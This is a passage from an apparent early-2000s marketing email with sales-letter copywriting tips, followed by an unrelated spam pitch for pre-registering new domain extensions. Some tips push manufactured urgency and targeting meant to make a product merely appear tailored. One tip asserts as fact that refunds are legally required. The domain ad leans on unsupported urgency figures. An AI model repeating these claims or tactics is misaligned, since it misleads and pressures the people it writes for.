<br>create a desire in the reader to continue through your ad
<br>copy.&nbsp; After all, if they are already interested after the
<br>first list of benefits, they will certainly be open to
<br>finding out even more reasons why your product or service
<br>will aid them.
<p>6) Just let it all flow out.&nbsp; Write down everything that
<br>enters your mind as you are writing your sales letter. You
<br>can edit it later.&nbsp; If you just sit and start writing
<br>everything you know about your product or service and how it
<br>will benefit your customer, you will be amazed at how much
<br>information floods your mind.&nbsp; Write it ALL down.&nbsp; Then read
<br>through it - you'll be able to add a lot more detail to
<br>many of the points.&nbsp; Edit it after you have exhausted all
<br>of your ideas.
<p>7) Make your sales letter personal.&nbsp; Make sure that the
<br>words "you" and "your" are at least 4:1 over "I" and "my."
<br>Your ad copy must be written about YOUR CUSTOMER not
<br>yourself.&nbsp; I'm not sure how the old advertising adage goes,
<br>but it's something like this, "I don't care a thing about
<br>your lawn mower, I just care about my lawn."&nbsp; Leads aren't
<br>interested in you or your products, they are interested in
<br>themselves and their wants and needs.&nbsp; When you are finished
<br>with your sales letter and have uploaded it to a test
<br>webpage, run a check at http://www.keywordcount.com and see
<br>what the ratio between "you" and "your" versus references to
<br>"I," "me," "my," etc.&nbsp; It's a free service.&nbsp; Make sure it's
<br>at least 4:1 in favor of the customer.
<p>8) Write like you speak.&nbsp; Forget all of those rules that
<br>your grammar teacher taught you.&nbsp; Write your sales letters
<br>in everyday language, just like you would talk in person.
<br>Don't be afraid to begin sentences with "And" or "Because."
<br>Don't worry about ending a sentence with a preposition.
<br>Write like you speak. Your sales letter isn't the great
<br>American novel, so don't write it like you are Ernest
<br>Hemingway.
<p>9) Use short paragraphs consisting of 2-4 sentences each.
<br>Long copy works... but long paragraphs do not.&nbsp; Use short
<br>paragraphs that lead into the next paragraph. Don't be
<br>afraid to use short sentences.&nbsp; Like this one.
<p>Or this.
<p>See what I mean?&nbsp; Shorter paragraphs keep the interest of
<br>the reader. Longer paragraphs cause eye strain and often
<br>force the reader to get distracted.
<p>10)&nbsp; Stress the benefits, not the features.&nbsp; Again,
<br>readers want the burning question answered, "What's in it
<br>for&nbsp; me?"&nbsp; What need is it going to meet? What want is it
<br>going to fill?&nbsp; How is your product or service going to be
<br>of value or benefit to the reader?&nbsp; Spell it out.&nbsp; Don't
<br>focus on the features of your product or service , but
<br>rather how those features will add value to the life of your
<br>reader.
<p>For example:&nbsp; If you are selling automobile tires, you may
<br>very well have the largest assortment of tires in the world,
<br>but who cares? I don't care about your selection. But, I
<br>do care about keeping my 3-month-old baby girl safe while
<br>we are traveling.&nbsp; So, instead of focusing on your selection,
<br>you focus on the fact that my baby girl can be kept safe
<br>because you have a tire that will fit my car. You're not
<br>selling tires, you're selling safety for my family. Stress
<br>the benefits, not the features.
<p>11) Keep the reader interested.&nbsp; Some sales letters read
<br>like they are a manual trying to explain to me how I can
<br>perform some complicated surgery on my wife. They are
<br>filled with words and phrases that I need a dictionary to
<br>understand.&nbsp; Unless you are writing to a very targeted
<br>audience, avoid using technical language that many readers
<br>might not understand. Keep it simple, using words, language
<br>and information that are easy to understand and follow.
<p>12) Target your sales letter.&nbsp; When you are finished with
<br>your final draft of the sales letter, target it to a
<br>specific audience.&nbsp; For example: If you are selling a "work
<br>at home" product, then rewrite the sales letter by adding
<br>words in the headlines and ad copy that are targeted towards
<br>women who are homemakers.&nbsp; Then, rewrite the same sales
<br>letter and target it to college students.&nbsp; Write another
<br>letter targeting senior citizens.&nbsp; Still another could be
<br>written to high school teachers wanting to earn extra income
<br>during summer vacation.&nbsp; The possibilities are endless.
<p>All you need to do is add a few words here and there in
<br>your ad copy to make it appear that your product or service
<br>is specifically designed for a target audience. "Work only
<br>5 hours a week," would become "College Students, work only
<br>5 hours a week."&nbsp; Your sales letter is now targeted. Upload
<br>all of the sales letters to separate pages on your website
<br>(you could easily target 100's of groups).
<p>Then, simply advertise the targeted pages in targeted
<br>mediums.&nbsp; You could advertise the "College Students" page
<br>in a campus ezine.&nbsp; The "Senior Citizens" page could be
<br>advertised at a retirement community message board.
<p>By creating these targeted sales letters, you can literally
<br>open up dozens of new groups to sell your existing product
<br>to.&nbsp; And, in their eyes, it looks like the product was a
<br>match made for them.
<p>13) Make your ad copy easy to follow.&nbsp; Use short sentences
<br>and paragraphs. Break up the sales letter with attention
<br>grabbing headlines that lead into the next paragraph. One
<br>thing that I have always found to work very well in sales
<br>letters...
<p>&nbsp;&nbsp;&nbsp;&nbsp; ...is to use a pause like this.
<p>Start the sentence on one line, leaving the reader wanting
<br>to know more, and then finishing up on the next line. Also,
<br>if you are going to use a sales letter that continues on
<br>several different pages of your website, use a catchy hook
<br>line at the end of each page to keep them clicking. "Let's
<br>get you started down the road to success, shall we? CLICK
<br>HERE to continue."
<p>14) Use similes and metaphors for effect.&nbsp; When the
<br>customer purchases your product, they will generate "a flood
<br>of traffic that would make Noah start building another ark."
<br>If they do not order today, then they will "feel like a cat
<br>that let the mouse get away."&nbsp; Use words to create a picture
<br>in the readers' mind.&nbsp; When you think of Superman, what
<br>comes to mind?&nbsp; Immediately, we remember that he is "faster
<br>than a speeding bullet."&nbsp; "More powerful than a locomotive."
<br>"Able to leap tall buildings in a single bound." See how
<br>word pictures stick in our minds?
<p>15) Focus on one product or service.&nbsp; Don't try to sell
<br>your customer multiple products at the same time. It only
<br>confuses the reader.&nbsp; Keep your ad copy directed at one
<br>specific product or service.&nbsp; Then, use other products and
<br>services as back-end products.
<p>16) Make it stand out.&nbsp; Don't kid yourself.&nbsp; There are
<br>hundreds, maybe thousands out there on the web doing the
<br>same thing you are doing.&nbsp; How will you stand out among the
<br>crowd?&nbsp; Your sales letter must inject personality. It must
<br>breathe of originality.&nbsp; Your product or service is
<br>different. It's not like all of the rest.&nbsp; It is unique.
<br>Right? Your sales letter must separate you from the
<br>competition.&nbsp; It must create a feeling of "You won't find
<br>this anywhere else."
<p>17) Be believable. "Earn $54,000 in the next 24 hours!!!"
<br>Delete.&nbsp; Good grief, do they think I am an idiot or
<br>something?&nbsp; Get real.&nbsp; Don't make outrageous claims that
<br>are obviously not the truth.&nbsp; You'll ruin your reputation.
<br>Let me tell you a simple universal fact that cannot be
<br>reversed.&nbsp; Once you have been branded a liar, you will
<br>NEVER be anything but a liar.&nbsp; It doesn't matter if you
<br>launch the most respectable, honest business available
<br>anywhere, people will always have doubt because they
<br>remember the crazy stuff you've said before.&nbsp; Be believable.
<br>Don't exaggerate, mislead, stretch or distort the truth.
<p>18) Be specific. Don't generalize your information, but
<br>rather be EXACT.&nbsp; Instead of "over 100 tips for losing
<br>weight" use "124 tips for losing weight." By generalizing
<br>information, it creates doubt and questions in the reader's
<br>mind.&nbsp; "What am I really getting here?&nbsp; Does he even know?"
<br>When you use specific information, the reader begins to
<br>think, "This person must have counted.&nbsp; I know exactly what
<br>I can expect."&nbsp; "Platitudes and generalities roll off the
<br>human understanding like water from a duck," wrote Claude
<br>Hopkins in his classic book "Scientific Advertising." "They
<br>leave no impression whatsoever."
<p>19) Be complete. Tell the reader everything they would
<br>want to know about your product or service.&nbsp; Answer all of
<br>their questions, anything they would want to consider before
<br>making a purchase.&nbsp; Think about it from their point of view.
<br>Ask yourself, "Why wouldn't I buy this?"&nbsp; Then, address that
<br>in your sales letter.&nbsp; Remove anything that would keep the
<br>reader from making the purchase.
<p>20) Use testimonials to boost your sales.&nbsp; Share actual
<br>excerpts from what your current customers are saying about
<br>your product or service. Many websites have an entire
<br>section or even a separate page that has endorsements and
<br>compliments listed.&nbsp; Satisfied customers remove some of the
<br>doubt in the mind of the reader.&nbsp; "If these people have
<br>found a lot of value and benefit in the product, then I
<br>probably will too."&nbsp; Especially effective are testimonials
<br>from respected, well known "authorities" within your target
<br>field.
<p>21) Use headlines over and over throughout the sales letter.
<br>A headline isn't just relegated to the beginning of your
<br>ad copy.&nbsp; Use them frequently -but don't overuse.&nbsp; A well-
<br>placed headline re-grabs the reader's attention, brings
<br>them deeper into the letter, and readies them for the next
<br>paragraph. You will want to spend as much time working on
<br>your headlines as you do the entire sales letter.&nbsp; They are
<br>that important.
<p>22) Avoid asking stupid questions.&nbsp; "Wouldn't you like to
<br>make $1,000,000 a year?" "Doesn't that sound great?" "Would
<br>you like to be as successful as I am?"&nbsp; Avoid any question
<br>that insults the intelligence of your reader or makes them
<br>feel like they are inferior.
<p>23) Offer a freebie even if the customer doesn't buy.
<br>If the customer decides he or she isn't going to make a
<br>purchase, then you want to follow-up with them later to try
<br>to influence them to buy in the future.&nbsp; By offering a free
<br>item, you can&nbsp; request their email address in order to
<br>obtain the freebie.&nbsp; By doing this, you can now follow-up
<br>with the customer for a potential future sale.
<br>Additionally, you can continue the sales process by having
<br>your ad copy, banners, flyers, etc. within the free item.
<br>And, of course, if your free item is a high quality, useful
<br>product or service which impresses the customer, they
<br>probably will be back as a customer soon.
<p>24) Use bonuses to overwhelm the reader.&nbsp; One of the things
<br>that I have found very effective in writing sales letters
<br>is to include bonus items that OUT-VALUE the actual product
<br>I am offering.&nbsp; Ginsu made this one famous. They were
<br>selling a set of steak knives, but before the commercial
<br>was finished, you had so many bonus items on the table
<br>it was hard to refuse. Make sure you provide quality
<br>bonuses and not some worthless, outdated junk that damages
<br>the credibility of your main offer.
<p>25) Use connective phrases like "But wait, there's more"
<br>and "But that's not all."&nbsp; These phrases effectively lead
<br>the reader from one paragraph to the next, particularly
<br>when the next paragraph is a bullet list of benefits, or
<br>leads into bonus items.&nbsp; Again, the idea is MORE and MORE
<br>value and benefits to the reader.
<p>26) Always include a deadline.&nbsp; By including a deadline,
<br>you create a sense of urgency in the mind of the customer.
<br>"If I don't order within 24 hours, then I won't get the
<br>bonuses."&nbsp; "Oh no, there are only 10 items remaining,
<br>I've got to hurry."&nbsp; Let the customer know what they will
<br>be missing out on if they don't make the deadline. Remember,
<br>they won't miss out on your products or bonuses, they will
<br>miss out on all of the benefits of your products. Deadlines
<br>are very effective.&nbsp; Every sales letter should have one.
<p>27) Tell them exactly how to order.&nbsp; Be clear as to the
<br>order process. Point them towards the order link.&nbsp; Tell
<br>them what methods you offer. (I.E. credit cards, checks,
<br>etc.)&nbsp; Make this process as simple and clear as can be.
<br>If it takes more than 2 steps, most people won't continue.
<p>28)&nbsp; Explain when the product will be delivered.&nbsp; How
<br>quickly will the order be processed?&nbsp; When will the order be
<br>available?&nbsp; Let the customer know exactly what they can
<br>expect when they place their order.&nbsp; The more specific you
<br>can be here, the better.&nbsp; Let them know that you have a
<br>system in place.&nbsp; "Operators are standing by."&nbsp; Their order
<br>will be handled properly.&nbsp; Tell them.
<p>29) Offer a money back guarantee.&nbsp; Take away their last
<br>reason to hold back.&nbsp; Offer a "no questions asked" 30 day
<br>guarantee.&nbsp; Most people may not realize this, but in most
<br>cases, it's the law of the land.&nbsp; You are REQUIRED to give
<br>them their money back if they are not satisfied with the
<br>product or service.&nbsp; Since it's the law anyway, why not make
<br>it a benefit. Let them know that they are purchasing your
<br>product or service RISK-FREE.
<p>30) Instruct them to respond immediately.&nbsp; Many people
<br>just need to read those words, "Act Now!"&nbsp; "Order today!"
<br>"Click Here to Instantly Place Your Order."&nbsp; You've got them
<br>this far, now tell them what you want them to do.&nbsp; Get them
<br>to "Act Fast!"&nbsp; Have you ever heard a mail order commercial
<br>on television that didn't prompt the viewer to order right
<br>way?
<p>31) Include a post script.&nbsp; People will always read the
<br>P.S.&nbsp; Always. In fact, the P.S. is one of the MOST IMPORTANT
<br>parts of your sales letter. Why?&nbsp; Because in many cases the
<br>visitor at your website will scroll immediately down to the
<br>end of your page to see how much it is going to cost.&nbsp; A
<br>P.S. is a perfect place to recap your offer, so when they
<br>see your price tag, they will also see a very detailed
<br>description of what they will receive for their money. Use
<br>your P.S. to restate your offer in detail.
<p>32) Include a second post script.&nbsp; You better believe
<br>if they read the first P.S., they will read a P.P.S.&nbsp; Use
<br>this post script to remind them of the deadline or offer
<br>another bonus or point out some compelling factor that would
<br>make them want to order.&nbsp; I guarantee you they will read it.
<p>Use these 32 tips and I guarantee you that you will see
<br>a significant increase in the amount of responses you
<br>receive from your sales letters.&nbsp; In fact, it would be
<br>impossible for your responses to not improve.

Organization: 


Attention:  Internet Domain Registrant

The new top level domain names with extensions .BIZ, .INFO, .PRO, 
and .NAME have just been approved by global internet authorities 
and will be released soon, but don't wait until then to register.  
These domains are available NOW for pre-registration at:
http://www.RegisterNewExtensions.net on a first come, first serve 
basis.

"While .com names hold the most prestige, the next frontier is
the new suffixes -.info, .biz, and .pro -likely to become available
later this year..."
-BUSINESS WEEK MAGAZINE, April 16, 2001.

It is expected that over 3 million of these new domain names will be
registered in the first few minutes when registration officially opens
later this year. If your domain name is important to you, be prepared 
and pre-register now. Protect your domain name from cybersquatters and 
speculators. We have the premier pre-registration engine to help you 
to secure the domain you want.  Over 250,000 names have already been 
queued into our list and good names are going fast.  Do not wait until 
the last minute.  Go to http://www.RegisterNewExtensions.net now to 
pre-register.
